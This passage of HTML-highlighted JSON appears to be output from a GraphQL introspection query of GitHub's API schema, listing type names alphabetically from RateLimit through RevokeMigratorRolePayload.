class="string">&quot;RateLimit&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Reactable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactingUserConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactingUserEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Reaction&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionContent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionGroup&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactionOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Reactor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReactorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReadyForReviewEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Ref&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RefConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RefEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RefOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RefOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RefUpdateRule&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReferencedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReferencedSubject&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RegenerateEnterpriseIdentityProviderRecoveryCodesInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RegenerateEnterpriseIdentityProviderRecoveryCodesPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RegenerateVerifiableDomainTokenInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RegenerateVerifiableDomainTokenPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RejectDeploymentsInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RejectDeploymentsPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Release&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseAsset&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseAssetConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseAssetEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReleaseOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveAssigneesFromAssignableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveAssigneesFromAssignablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseAdminInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseAdminPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseIdentityProviderInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseIdentityProviderPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseOrganizationInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseOrganizationPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseSupportEntitlementInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveEnterpriseSupportEntitlementPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveLabelsFromLabelableInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveLabelsFromLabelablePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveOutsideCollaboratorInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveOutsideCollaboratorPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveReactionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveReactionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveStarInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveStarPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveUpvoteInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemoveUpvotePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RemovedFromProjectEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RenamedTitleEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RenamedTitleSubject&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReopenIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReopenIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReopenPullRequestInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReopenPullRequestPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReopenedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoAccessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoAccessAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoAddMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoAddMemberAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoAddTopicAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoArchivedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoArchivedAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoChangeMergeSettingAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoChangeMergeSettingAuditEntryMergeType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigDisableAnonymousGitAccessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigDisableCollaboratorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigDisableContributorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigDisableSockpuppetDisallowedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigEnableAnonymousGitAccessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigEnableCollaboratorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigEnableContributorsOnlyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigEnableSockpuppetDisallowedAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigLockAnonymousGitAccessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoConfigUnlockAnonymousGitAccessAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoCreateAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoCreateAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoDestroyAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoDestroyAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoRemoveMemberAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoRemoveMemberAuditEntryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepoRemoveTopicAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReportedContentClassifiers&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Repository&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryAffiliation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryCodeowners&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryCodeownersError&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryCollaboratorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryCollaboratorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryContactLink&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryContributionType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryDiscussionAuthor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryDiscussionCommentAuthor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInteractionAbility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInteractionLimit&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInteractionLimitExpiry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInteractionLimitOrigin&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInvitation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInvitationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInvitationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInvitationOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryInvitationOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryLockReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigration&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigrationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigrationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigrationOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigrationOrderDirection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryMigrationOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryNode&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryPermission&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryPrivacy&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryTopic&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryTopicConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryTopicEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVisibility&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVisibilityChangeDisableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVisibilityChangeEnableAuditEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVulnerabilityAlert&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVulnerabilityAlertConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVulnerabilityAlertEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RepositoryVulnerabilityAlertState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequestReviewsInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequestReviewsPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequestableCheckStatusState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequestedReviewer&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequirableByPullRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequiredStatusCheckDescription&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RequiredStatusCheckInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RerequestCheckSuiteInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RerequestCheckSuitePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ResolveReviewThreadInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ResolveReviewThreadPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RestrictedContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewDismissalAllowance&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewDismissalAllowanceActor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewDismissalAllowanceConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewDismissalAllowanceEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewDismissedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewRequestConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewRequestEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewRequestRemovedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewRequestedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ReviewStatusHovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RevokeEnterpriseOrganizationsMigratorRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RevokeEnterpriseOrganizationsMigratorRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RevokeMigratorRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;RevokeMigratorRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span 